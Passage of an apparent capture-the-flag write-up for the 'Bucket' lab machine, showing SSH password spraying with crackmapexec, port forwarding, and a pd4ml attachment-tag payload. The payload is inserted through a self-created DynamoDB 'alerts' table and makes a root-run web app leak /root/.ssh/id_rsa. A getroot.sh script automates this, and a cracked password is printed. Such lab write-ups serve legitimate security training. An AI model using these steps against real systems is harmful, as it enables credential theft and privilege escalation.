+<h4 id="ssh-access">SSH Access</h4>
+<p>Password <code>n2vM-&lt;_K_Q:.Aa2</code> works on <code>roy</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
+$ crackmapexec ssh <span style="color:#e6db74">&#39;10.10.10.212&#39;</span> -u roy -p passwords.list
+SSH         10.10.10.212    <span style="color:#ae81ff">22</span>     10.10.10.212     <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> SSH-2.0-OpenSSH_8.2p1 Ubuntu-4
+SSH         10.10.10.212    <span style="color:#ae81ff">22</span>     10.10.10.212     <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> roy:Management@#1@# Authentication failed.
+SSH         10.10.10.212    <span style="color:#ae81ff">22</span>     10.10.10.212     <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> roy:Welcome123! Authentication failed.
+SSH         10.10.10.212    <span style="color:#ae81ff">22</span>     10.10.10.212     <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> roy:n2vM-&lt;_K_Q:.Aa2 
+</code></pre></div><p>Now I can login into the system using <code>roy</code> credentials.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@iamf «bucket» «10.10.14.39» 
+$ ssh roy@10.10.10.212
+roy@10.10.10.212&#39;s password: 
+Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-48-generic x86_64)
+
+...&lt;SNIP&gt;...
+  System load:                      0.02
+  Usage of /:                       33.8% of 17.59GB
+  Memory usage:                     29%
+  Swap usage:                       0%
+  Processes:                        252
+  Users logged in:                  0
+  IPv4 address for br-bee97070fb20: 172.18.0.1
+  IPv4 address for docker0:         172.17.0.1
+  IPv4 address for ens160:          10.10.10.212
+  IPv6 address for ens160:          dead:beef::250:56ff:feb9:df48
+
+...&lt;SNIP&gt;...
+roy@bucket:~$ id
+uid=1000(roy) gid=1000(roy) groups=1000(roy),1001(sysadm)
+roy@bucket:~$ 
+</code></pre></div><p>The user flag is done here.</p>
+<p><div class="img-container"><img src="imgs/image-20210423013951765.png" alt="image-20210423013951765"  /></div>
+</p>
+<h3 id="shell-as-root">Shell as root</h3>
+<h4 id="enumeration-2">Enumeration</h4>
+<p>Running WinPEAS discovers another service currently running on port 8000.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">[+] Active Ports
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports                                                                                                 
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                                     
+tcp        0      0 127.0.0.1:4566          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:46275         0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::80                   :::*                    LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      - 
+</code></pre></div><p>It also discovers that <code>bucket-app</code> in <code>/var/www/</code> is belong to the root user and readable to user <code>roy</code> but not to others.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">[+] Readable files belonging to root and readable by me but not world readable
+-rwxr-x---+ 1 root root 808729 Jun 10  2020 /var/www/bucket-app/pd4ml_demo.jar                                 
+-rw-r-x---+ 1 root root 358 Aug  6  2016 /var/www/bucket-app/vendor/psr/http-message/README.md
+-rw-r-x---+ 1 root root 1085 Aug  6  2016 /var/www/bucket-app/vendor/psr/http-message/LICENSE
+-rw-r-x---+ 1 root root 4689 Aug  6  2016 /var/www/bucket-app/vendor/psr/http-message/src/UploadedFileInterface.php
+-rw-r-x---+ 1 root root 4746 Aug  6  2016 /var/www/bucket-app/vendor/psr/http-message/src/StreamInterface.php
+</code></pre></div><p>I can list the contents inside <code>bucket-app</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">roy@bucket:/var/www/bucket-app$ ls -la
+total <span style="color:#ae81ff">856</span>
+drwxr-x---+  <span style="color:#ae81ff">4</span> root root   <span style="color:#ae81ff">4096</span> Feb <span style="color:#ae81ff">10</span> 12:29 .
+drwxr-xr-x   <span style="color:#ae81ff">4</span> root root   <span style="color:#ae81ff">4096</span> Feb <span style="color:#ae81ff">10</span> 12:29 ..
+-rw-r-x---+  <span style="color:#ae81ff">1</span> root root     <span style="color:#ae81ff">63</span> Sep <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2020</span> composer.json
+-rw-r-x---+  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">20533</span> Sep <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2020</span> composer.lock
+drwxr-x---+  <span style="color:#ae81ff">2</span> root root   <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">22</span> 12:38 files
+-rwxr-x---+  <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">17222</span> Sep <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2020</span> index.php
+-rwxr-x---+  <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">808729</span> Jun <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">2020</span> pd4ml_demo.jar
+drwxr-x---+ <span style="color:#ae81ff">10</span> root root   <span style="color:#ae81ff">4096</span> Feb <span style="color:#ae81ff">10</span> 12:29 vendor
+</code></pre></div><p>According to the Apache config file, the service on port 8000 is an internal website, and it is assigned to the root user. In other words, it is running as root.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml">roy@bucket:~$ cat /etc/apache2/sites-available/000-default.conf 
+
+<span style="color:#f92672">&lt;VirtualHost</span> <span style="color:#960050;background-color:#1e0010">127.0.0.1:8000</span><span style="color:#f92672">&gt;</span> # unknown
+        <span style="color:#f92672">&lt;IfModule</span> <span style="color:#960050;background-color:#1e0010">mpm_itk_module</span><span style="color:#f92672">&gt;</span>
+                AssignUserId root root
+        <span style="color:#f92672">&lt;/IfModule&gt;</span>
+        DocumentRoot /var/www/bucket-app
+<span style="color:#f92672">&lt;/VirtualHost&gt;</span>
+
+<span style="color:#f92672">&lt;VirtualHost</span> <span style="color:#960050;background-color:#1e0010">*:80</span><span style="color:#f92672">&gt;</span> # bucket.htb
+        DocumentRoot /var/www/html
+        RewriteEngine On
+        RewriteCond %{HTTP_HOST} !^bucket.htb$
+        RewriteRule /.* http://bucket.htb/ [R]
+<span style="color:#f92672">&lt;/VirtualHost&gt;</span>
+<span style="color:#f92672">&lt;VirtualHost</span> <span style="color:#960050;background-color:#1e0010">*:80</span><span style="color:#f92672">&gt;</span> # s3.bucket.htb 
+
+        ProxyPreserveHost on
+        ProxyPass / http://localhost:4566/
+        ProxyPassReverse / http://localhost:4566/
+        <span style="color:#f92672">&lt;Proxy</span> <span style="color:#960050;background-color:#1e0010">*</span><span style="color:#f92672">&gt;</span>
+                 Order deny,allow
+                 Allow from all
+         <span style="color:#f92672">&lt;/Proxy&gt;</span>
+        ServerAdmin webmaster@localhost
+        ServerName s3.bucket.htb
+
+        ErrorLog ${APACHE_LOG_DIR}/error.log
+        CustomLog ${APACHE_LOG_DIR}/access.log combined
+
+<span style="color:#f92672">&lt;/VirtualHost&gt;</span>
+</code></pre></div><h4 id="internal-web">Internal Web</h4>
+<p>I&rsquo;ll expose the internal web to my localhost on the same port using SSH local port forwarding.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">roy@bucket:/var/www/bucket-app$ ~C
+ssh&gt; -L 8000:127.0.0.1:8000
+Forwarding port.
+roy@bucket:/var/www/bucket-app$
+</code></pre></div><p>The website page says the site is under construction.</p>
+<p><div class="img-container"><img src="imgs/image-20210423015905604.png" alt="image-20210423015905604"  /></div>
+</p>
+<h4 id="source-code-review">Source Code Review</h4>
+<p>Upon reviewing the <code>index.php</code>, I found out that this website can be abused.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">roy@bucket:/var/www/bucket-app$ cat index.php 
+
+&lt;?php
+require <span style="color:#e6db74">&#39;vendor/autoload.php&#39;</span>;
+use Aws<span style="color:#ae81ff">\D</span>ynamoDb<span style="color:#ae81ff">\D</span>ynamoDbClient;
+<span style="color:#66d9ef">if</span><span style="color:#f92672">(</span>$_SERVER<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;REQUEST_METHOD&#34;</span><span style="color:#f92672">]===</span><span style="color:#e6db74">&#34;POST&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+        <span style="color:#66d9ef">if</span><span style="color:#f92672">(</span>$_POST<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;action&#34;</span><span style="color:#f92672">]===</span><span style="color:#e6db74">&#34;get_alerts&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span> <span style="color:#75715e"># POST action=get_alerts </span>
+                date_default_timezone_set<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;America/New_York&#39;</span><span style="color:#f92672">)</span>;
+                $client <span style="color:#f92672">=</span> new DynamoDbClient<span style="color:#f92672">([</span>  <span style="color:#75715e"># Connect to DynamoDB.</span>
+                        <span style="color:#e6db74">&#39;profile&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;default&#39;</span>,
+                        <span style="color:#e6db74">&#39;region&#39;</span>  <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;us-east-1&#39;</span>,
+                        <span style="color:#e6db74">&#39;version&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;latest&#39;</span>,
+                        <span style="color:#e6db74">&#39;endpoint&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;http://localhost:4566&#39;</span>
+                <span style="color:#f92672">])</span>;
+                
+                $iterator <span style="color:#f92672">=</span> $client-&gt;getIterator<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;Scan&#39;</span>, array<span style="color:#f92672">(</span> <span style="color:#75715e"># Read content from table alerts</span>
+                        <span style="color:#e6db74">&#39;TableName&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;alerts&#39;</span>,
+                        <span style="color:#e6db74">&#39;FilterExpression&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#34;title = :title&#34;</span>, <span style="color:#75715e"># Filter by title</span>
+                        <span style="color:#e6db74">&#39;ExpressionAttributeValues&#39;</span> <span style="color:#f92672">=</span>&gt; array<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;:title&#34;</span><span style="color:#f92672">=</span>&gt;array<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;S&#34;</span><span style="color:#f92672">=</span>&gt;<span style="color:#e6db74">&#34;Ransomware&#34;</span><span style="color:#f92672">))</span>,
+                <span style="color:#f92672">))</span>;
+
+                foreach <span style="color:#f92672">(</span>$iterator as $item<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>  <span style="color:#75715e"># </span>
+                        $name<span style="color:#f92672">=</span>rand<span style="color:#f92672">(</span>1,10000<span style="color:#f92672">)</span>.<span style="color:#e6db74">&#39;.html&#39;</span>; <span style="color:#75715e"># Generate randomnumber.html </span>
+                        file_put_contents<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;files/&#39;</span>.$name,$item<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;data&#34;</span><span style="color:#f92672">])</span>; <span style="color:#75715e"># Write contents to randomnumber.html</span>
+                <span style="color:#f92672">}</span>
+                passthru<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/</span>$name<span style="color:#e6db74"> 800 A4 -out files/result.pdf&#34;</span><span style="color:#f92672">)</span>; <span style="color:#75715e"># convert randomnumber.html to result.pdf</span>
+        <span style="color:#f92672">}</span>
+<span style="color:#f92672">}</span>
+<span style="color:#66d9ef">else</span>
+<span style="color:#f92672">{</span>
+?&gt;
+...&lt;SNIP&gt;...
+</code></pre></div><p>Let&rsquo;s break it down.</p>
+<p>When there is a POST request contains data of <code>action=get_alerts</code>, the site will create a connection to DynamoDB.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">if</span>($_SERVER[<span style="color:#e6db74">&#34;REQUEST_METHOD&#34;</span>]<span style="color:#f92672">===</span><span style="color:#e6db74">&#34;POST&#34;</span>) {
+        <span style="color:#66d9ef">if</span>($_POST[<span style="color:#e6db74">&#34;action&#34;</span>]<span style="color:#f92672">===</span><span style="color:#e6db74">&#34;get_alerts&#34;</span>) { <span style="color:#75715e"># POST action=get_alerts 
+</span><span style="color:#75715e"></span>                <span style="color:#a6e22e">date_default_timezone_set</span>(<span style="color:#e6db74">&#39;America/New_York&#39;</span>);
+                $client <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">DynamoDbClient</span>([  <span style="color:#75715e"># Connect to DynamoDB.
+</span><span style="color:#75715e"></span>                        <span style="color:#e6db74">&#39;profile&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;default&#39;</span>,
+                        <span style="color:#e6db74">&#39;region&#39;</span>  <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;us-east-1&#39;</span>,
+                        <span style="color:#e6db74">&#39;version&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;latest&#39;</span>,
+                        <span style="color:#e6db74">&#39;endpoint&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;http://localhost:4566&#39;</span>
+                ]);
+</code></pre></div><p>It then reads every item in table <code>alerts</code> and filters out the result only to the one that contains string value of “Ransomware” (the key).</p>
+<blockquote>
+<p>DynamoDB is key-value NoSQL database.</p>
+</blockquote>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$iterator <span style="color:#f92672">=</span> $client<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">getIterator</span>(<span style="color:#e6db74">&#39;Scan&#39;</span>, <span style="color:#66d9ef">array</span>( <span style="color:#75715e"># Read content from table alerts
+</span><span style="color:#75715e"></span>       <span style="color:#e6db74">&#39;TableName&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;alerts&#39;</span>,
+       <span style="color:#e6db74">&#39;FilterExpression&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#34;title = :title&#34;</span>, <span style="color:#75715e"># Filter by title
+</span><span style="color:#75715e"></span>       <span style="color:#e6db74">&#39;ExpressionAttributeValues&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;:title&#34;</span><span style="color:#f92672">=&gt;</span><span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;S&#34;</span><span style="color:#f92672">=&gt;</span><span style="color:#e6db74">&#34;Ransomware&#34;</span>)),
+));
+</code></pre></div><p>For each result, it writes the result value ($item[“data”]) of &ldquo;Ransomware&rdquo; to a randomly named HTML file.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">foreach</span> ($iterator <span style="color:#66d9ef">as</span> $item) {  <span style="color:#75715e"># 
+</span><span style="color:#75715e"></span>        $name<span style="color:#f92672">=</span><span style="color:#a6e22e">rand</span>(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">10000</span>)<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;.html&#39;</span>; <span style="color:#75715e"># Generate randomnumber.html 
+</span><span style="color:#75715e"></span>        <span style="color:#a6e22e">file_put_contents</span>(<span style="color:#e6db74">&#39;files/&#39;</span><span style="color:#f92672">.</span>$name,$item[<span style="color:#e6db74">&#34;data&#34;</span>]); <span style="color:#75715e"># Write contents to randomnumber.html
+</span><span style="color:#75715e"></span>}
+</code></pre></div><p>The HTML file then gets converted into a PDF file (<code>result.pdf</code>) using <code>pd4ml</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">passthru</span>(<span style="color:#e6db74">&#34;java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/</span><span style="color:#e6db74">$name</span><span style="color:#e6db74"> 800 A4 -out files/result.pdf&#34;</span>); <span style="color:#75715e"># convert randomnumber.html to result.pdf
+</span></code></pre></div><p>From the enumeration above on the DynamoDB, I know there is no table called <code>alerts</code>.</p>
+<p>The idea is, if I have a control over the <code>alerts</code> table as well as the write and read operations on the table, then I can abuse this web application to read almost any file on the system* (arbitrary file read)</p>
+<blockquote>
+<p>*The web application is currently running as root</p>
+</blockquote>
+<h4 id="obtain-root-ssh-key">Obtain root SSH Key</h4>
+<p>First I’ll try to create a dummy table on the database. I’ll use JSON file to create it.</p>
+<p><code>test-table.json</code>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
+	<span style="color:#f92672">&#34;TableName&#34;</span>: <span style="color:#e6db74">&#34;iamf&#34;</span>,
+	<span style="color:#f92672">&#34;AttributeDefinitions&#34;</span>: 
+	[
+		{ <span style="color:#f92672">&#34;AttributeName&#34;</span>: <span style="color:#e6db74">&#34;Name&#34;</span>, <span style="color:#f92672">&#34;AttributeType&#34;</span> : <span style="color:#e6db74">&#34;S&#34;</span> }
+	],
+	<span style="color:#f92672">&#34;KeySchema&#34;</span>: 
+	[ 
+		{ <span style="color:#f92672">&#34;AttributeName&#34;</span>: <span style="color:#e6db74">&#34;Name&#34;</span>, <span style="color:#f92672">&#34;KeyType&#34;</span> : <span style="color:#e6db74">&#34;HASH&#34;</span> }
+	],
+	<span style="color:#f92672">&#34;ProvisionedThroughput&#34;</span> : 
+		{ <span style="color:#f92672">&#34;WriteCapacityUnits&#34;</span>: <span style="color:#ae81ff">5</span>, <span style="color:#f92672">&#34;ReadCapacityUnits&#34;</span>: <span style="color:#ae81ff">10</span> }
+}
+</code></pre></div><p>Now I can use the subcommand <code>create-table</code> with <code>--cli-input-json</code> option and specify the JSON file.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
+$ aws dynamodb create-table --cli-input-json file://test-table.json --endpoint-url  http://s3.bucket.htb
+
+<span style="color:#f92672">{</span>
+    <span style="color:#e6db74">&#34;TableDescription&#34;</span>: <span style="color:#f92672">{</span>
+        <span style="color:#e6db74">&#34;AttributeDefinitions&#34;</span>: <span style="color:#f92672">[</span>
+            <span style="color:#f92672">{</span>
+                <span style="color:#e6db74">&#34;AttributeName&#34;</span>: <span style="color:#e6db74">&#34;Name&#34;</span>,
+                <span style="color:#e6db74">&#34;AttributeType&#34;</span>: <span style="color:#e6db74">&#34;S&#34;</span>
+            <span style="color:#f92672">}</span>
+        <span style="color:#f92672">]</span>,
+        <span style="color:#e6db74">&#34;TableName&#34;</span>: <span style="color:#e6db74">&#34;iamf&#34;</span>,
+        <span style="color:#e6db74">&#34;KeySchema&#34;</span>: <span style="color:#f92672">[</span>
+            <span style="color:#f92672">{</span>
+                <span style="color:#e6db74">&#34;AttributeName&#34;</span>: <span style="color:#e6db74">&#34;Name&#34;</span>,
+                <span style="color:#e6db74">&#34;KeyType&#34;</span>: <span style="color:#e6db74">&#34;HASH&#34;</span>
+            <span style="color:#f92672">}</span>
+        <span style="color:#f92672">]</span>,
+        <span style="color:#e6db74">&#34;TableStatus&#34;</span>: <span style="color:#e6db74">&#34;ACTIVE&#34;</span>,
+        <span style="color:#e6db74">&#34;CreationDateTime&#34;</span>: <span style="color:#e6db74">&#34;2021-04-22T15:22:33.634000-04:00&#34;</span>,
+...&lt;SNIP&gt;...
+</code></pre></div><p>I can confirm the table has been created using the subcommand <code>list-tables</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
+$ aws dynamodb list-tables --endpoint-url http://s3.bucket.htb
+
+<span style="color:#f92672">{</span>
+    <span style="color:#e6db74">&#34;TableNames&#34;</span>: <span style="color:#f92672">[</span>
+        <span style="color:#e6db74">&#34;iamf&#34;</span>,
+        <span style="color:#e6db74">&#34;users&#34;</span>
+    <span style="color:#f92672">]</span>
+<span style="color:#f92672">}</span>
+</code></pre></div><blockquote>
+<p>I can also insert items to the table, but I&rsquo;ll skip it here. Detailed notes are available on my GitHub.</p>
+</blockquote>
+<p>Knowing this, now I can create the <code>alerts</code> table. I’ll write it on JSON format as well.</p>
+<p><code>alert-table.json</code>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
+        <span style="color:#f92672">&#34;TableName&#34;</span>: <span style="color:#e6db74">&#34;alerts&#34;</span>,
+        <span style="color:#f92672">&#34;AttributeDefinitions&#34;</span>:
+        [
+                {<span style="color:#f92672">&#34;AttributeName&#34;</span>: <span style="color:#e6db74">&#34;title&#34;</span>, <span style="color:#f92672">&#34;AttributeType&#34;</span> : <span style="color:#e6db74">&#34;S&#34;</span>},
+                {<span style="color:#f92672">&#34;AttributeName&#34;</span>: <span style="color:#e6db74">&#34;data&#34;</span>, <span style="color:#f92672">&#34;AttributeType&#34;</span> : <span style="color:#e6db74">&#34;S&#34;</span>}
+        ],
+        <span style="color:#f92672">&#34;KeySchema&#34;</span>:
+        [
+                {<span style="color:#f92672">&#34;AttributeName&#34;</span>: <span style="color:#e6db74">&#34;title&#34;</span>, <span style="color:#f92672">&#34;KeyType&#34;</span> : <span style="color:#e6db74">&#34;HASH&#34;</span>},
+                {<span style="color:#f92672">&#34;AttributeName&#34;</span>: <span style="color:#e6db74">&#34;data&#34;</span>, <span style="color:#f92672">&#34;KeyType&#34;</span> : <span style="color:#e6db74">&#34;RANGE&#34;</span>}
+        ],
+        <span style="color:#f92672">&#34;ProvisionedThroughput&#34;</span> :
+        {<span style="color:#f92672">&#34;WriteCapacityUnits&#34;</span>: <span style="color:#ae81ff">5</span>, <span style="color:#f92672">&#34;ReadCapacityUnits&#34;</span>: <span style="color:#ae81ff">10</span>}
+}
+</code></pre></div><p>Now to abuse the application for file read, I’ll put the root SSH key path within <code>&lt;pd4ml:attachment&gt;</code> tags. The tags can be used to embed a file [<a href="https://pd4ml.com/html.htm">source</a>]. I&rsquo;ll write it on JSON format and name it as <code>payload.json</code></p>
+<p><code>payload.json</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
+	<span style="color:#f92672">&#34;title&#34;</span>: { <span style="color:#f92672">&#34;S&#34;</span>: <span style="color:#e6db74">&#34;Ransomware&#34;</span> }, 
+    <span style="color:#f92672">&#34;data&#34;</span>: { <span style="color:#f92672">&#34;S&#34;</span>: <span style="color:#e6db74">&#34;&lt;pd4ml:attachment&gt;file:///root/.ssh/id_rsa&lt;/pd4ml:attachment&gt;&#34;</span> }
+}
+</code></pre></div><p>And finally, I’ll use a bash script to perform the execution, this is because there is a clean up script on the box. I’ll name the script as <code>getroot.sh</code>.</p>
+<p><code>getroot.sh</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
+</span><span style="color:#75715e"></span>
+echo <span style="color:#e6db74">&#34;[+] Create table&#34;</span>
+aws dynamodb create-table --cli-input-json file://alerts-table.json --endpoint-url<span style="color:#f92672">=</span>http://s3.bucket.htb &gt;/dev/null
+sleep 0.5
+echo <span style="color:#e6db74">&#34;[+] Insert item&#34;</span>
+aws dynamodb put-item --table-name alerts --item file://insert.json --endpoint-url<span style="color:#f92672">=</span>http://s3.bucket.htb &gt;/dev/null
+sleep 0.5
+echo <span style="color:#e6db74">&#34;[+] Send get alerts&#34;</span>
+curl -svd <span style="color:#e6db74">&#34;action=get_alerts&#34;</span> http://127.0.0.1:8000/ <span style="color:#75715e"># The port 8000 on Bucket forwarded to localhost:8000</span>
+</code></pre></div><blockquote>
+<p>The script assume all the required files are stored in the same folder.</p>
+</blockquote>
+<p>I’ll watch the result.pdf at <code>/var/www/bucket/files</code> and grab the SSH key using <code>roy</code>’s session.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">roy@bucket:/var/www/bucket-app/files$ <span style="color:#66d9ef">while</span> sleep 2; <span style="color:#66d9ef">do</span> sed -n <span style="color:#e6db74">&#39;/^-----BEGIN OPENSSH PRIVATE KEY-----$/,/^-----END OPENSSH PRIVATE KEY-----$/p&#39;</span> * 2&gt;/dev/null; <span style="color:#66d9ef">done</span>
+</code></pre></div><p>Now I can just execute the <code>getroot.sh</code> script and wait for it to complete.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
+$ ./getroot.sh  
+
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Create table
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Insert item
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Send get alerts
+*   Trying 127.0.0.1:8000...
+* TCP_NODELAY set
+* Connected to 127.0.0.1 <span style="color:#f92672">(</span>127.0.0.1<span style="color:#f92672">)</span> port <span style="color:#ae81ff">8000</span> <span style="color:#f92672">(</span><span style="color:#75715e">#0)</span>
+&gt; POST / HTTP/1.1
+&gt; Host: 127.0.0.1:8000
+&gt; User-Agent: curl/7.66.0
+&gt; Accept: */*
+&gt; Content-Length: <span style="color:#ae81ff">17</span>
+&gt; Content-Type: application/x-www-form-urlencoded
+&gt; 
+* upload completely sent off: <span style="color:#ae81ff">17</span> out of <span style="color:#ae81ff">17</span> bytes
+* Mark bundle as not supporting multiuse
+&lt; HTTP/1.1 <span style="color:#ae81ff">200</span> OK
+&lt; Date: Thu, <span style="color:#ae81ff">22</span> Apr <span style="color:#ae81ff">2021</span> 20:04:14 GMT
+&lt; Server: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+&lt; Content-Length: <span style="color:#ae81ff">0</span>
+&lt; Content-Type: text/html; charset<span style="color:#f92672">=</span>UTF-8
+&lt; 
+* Connection <span style="color:#75715e">#0 to host 127.0.0.1 left intact</span>
+</code></pre></div><p>On <code>roy</code> shell, I can see it captured the ssh key.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">roy@bucket:/var/www/bucket-app/files$ <span style="color:#66d9ef">while</span> sleep 1; <span style="color:#66d9ef">do</span> sed -n <span style="color:#e6db74">&#39;/^-----BEGIN OPENSSH PRIVATE KEY-----$/,/^-----END OPENSSH PRIVATE KEY-----$/p&#39;</span> * 2&gt;/dev/null; <span style="color:#66d9ef">done</span>
+
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+...&lt;SNIP&gt;...
+-----END OPENSSH PRIVATE KEY-----
+</code></pre></div><p>The full process as shown below:</p>
+<p><div class="img-container"><img src="imgs/image-20210425032310617.png" alt="image-20210425032310617"  /></div>
+</p>
+<p>I’ll save that key as <code>root_rsa</code> and change its permission to 600.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
+$ chmod <span style="color:#ae81ff">600</span> root_rsa
+</code></pre></div><p>After that, I can just login as root user using the SSH key I obtained.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@iamf «bucket» «10.10.14.39» 
+$ ssh -i root_rsa 10.10.10.212
+Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-48-generic x86_64)
+
+...&lt;SNIP&gt;...
+  IPv4 address for br-bee97070fb20: 172.18.0.1
+  IPv4 address for docker0:         172.17.0.1
+  IPv4 address for ens160:          10.10.10.212
